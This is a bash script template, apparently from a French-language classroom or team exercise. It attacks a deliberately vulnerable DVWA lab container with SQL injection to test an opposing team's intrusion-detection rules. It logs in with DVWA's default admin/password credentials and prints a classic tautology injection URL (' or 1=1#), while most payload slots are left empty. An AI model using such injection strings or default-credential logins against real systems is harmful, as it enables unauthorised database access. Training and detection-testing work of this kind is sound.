#!/bin/bash
# =============================================================================
#  payloads.sh — Equipe 4 — Round 1 (Injection SQL)
#
#  Usage (apres avoir deploye les regles adverses) :
#    bash attacks/equipe-4/payloads.sh <ip_dvwa>
#
#  Par defaut cible : dvwa (nom Docker)
# =============================================================================

TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq4.txt"

echo "=== Equipe 4 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Authentification DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null
echo "[*] Cookie recupere"
echo ""

# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
# echo "[1] Payload basique..."
echo "http://localhost:8080/vulnerabilities/sqli/?id=%27+or+1%3D1%23&Submit=Submit#"
RESULT=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
  -o /dev/null -w "%{http_code}")
echo "    HTTP $RESULT"

# ── Payload 2 ───────────────────────────────────────────────────────────────


# ── Payload 3 ───────────────────────────────────────────────────────────────


echo ""
echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
